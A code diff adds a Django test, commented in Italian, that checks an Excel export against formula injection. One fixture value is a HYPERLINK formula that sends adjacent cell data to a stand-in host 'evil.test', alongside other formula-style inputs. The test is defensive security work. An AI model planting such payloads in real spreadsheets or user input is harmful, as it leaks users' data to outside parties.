@@ -167,6 +167,48 @@ class SegnalazionePrepostoExcelExportTests(TestCase):
 
         self.assertEqual(response.status_code, 302)
 
+    def test_export_excel_does_not_write_live_formulas(self):
+        """Formula injection: titolo/descrizione sono testo libero dell'utente.
+
+        openpyxl scriverebbe come formula viva ('f') qualunque stringa che inizia
+        con "=": all'apertura in Excel verrebbe valutata (es. HYPERLINK che
+        esfiltra le celle accanto). Devono restare testo.
+        """
+        evil = '=HYPERLINK("http://evil.test?d="&A2,"clicca")'
+        SegnalazionePreposto.objects.create(
+            titolo=evil,
+            data_segnalazione=_aware_datetime(2026, 6, 1),
+            descrizione="+1+1",
+            preposto="@SUM(A1)",
+            chi_segnala="-2+3",
+            creato_da=self.user,
+        )
+
+        response = self.client.get(reverse("diario_preposto:export_excel"))
+        self.assertEqual(response.status_code, 200)
+
+        workbook = load_workbook(BytesIO(response.content))
+        try:
+            sheet = workbook["Diario Preposto"]
+            for row in sheet.iter_rows():
+                for cell in row:
+                    self.assertNotEqual(
+                        cell.data_type, "f",
+                        f"{cell.coordinate} = {cell.value!r} scritta come formula",
+                    )
+            evil_rows = [r for r in sheet.iter_rows(min_row=2) if r[2].value == evil]
+            self.assertEqual(len(evil_rows), 1)
+            riga = evil_rows[0]
+            self.assertEqual(riga[2].data_type, "s")
+            self.assertTrue(riga[2].quotePrefix)  # "tratta come testo"
+            for idx in (3, 4, 5):  # descrizione / preposto / chi segnala
+                self.assertTrue(riga[idx].quotePrefix)
+            # non-regressione: il conteggio allegati resta numerico
+            self.assertEqual(riga[7].value, 0)
+            self.assertEqual(riga[7].data_type, "n")
+        finally:
+            workbook.close()
+
 
 class IspezioniPrepostoTests(TestCase):
     def setUp(self):
